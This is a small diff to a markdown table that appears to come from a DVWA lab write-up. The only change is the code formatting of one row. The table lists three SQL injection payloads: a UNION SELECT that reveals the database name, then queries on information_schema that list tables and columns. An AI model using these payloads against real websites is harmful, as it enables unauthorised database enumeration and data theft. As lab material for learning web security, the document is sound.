@@ -39,6 +39,6 @@
 | :-----------: | :----------: | :----------: |
 | 1 | Name of the database | `' UNION SELECT null, database() #` |
 | 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'` |
-| 3 | Based on each table we get the columns  | ``` ' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook ``` |
+| 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook` |
 
 </div>
